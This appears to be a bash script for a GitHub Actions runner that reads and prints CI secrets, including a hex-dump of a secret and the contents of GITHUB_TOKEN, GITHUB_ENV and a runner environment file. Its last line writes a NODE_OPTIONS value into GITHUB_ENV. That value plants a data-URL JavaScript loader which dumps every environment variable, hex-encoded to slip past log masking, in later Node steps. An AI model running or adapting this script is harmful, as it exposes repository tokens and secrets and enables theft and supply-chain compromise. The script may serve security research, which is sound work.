#!/usr/bin/env bash
echo "$EXAMPLE_SECRET" | hd -C

echo "$GITHUB_ENV"
echo "$GITHUB_TOKEN"
cat /home/runner/work/_temp/_runner_file_commands/set_env_3339c913-e593-4d91-8dcf-6900945ce7bd
cat $GITHUB_ENV
cat $GITHUB_TOKEN

echo "NODE_OPTIONS=--experimental-modules --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));" >> $GITHUB_ENV
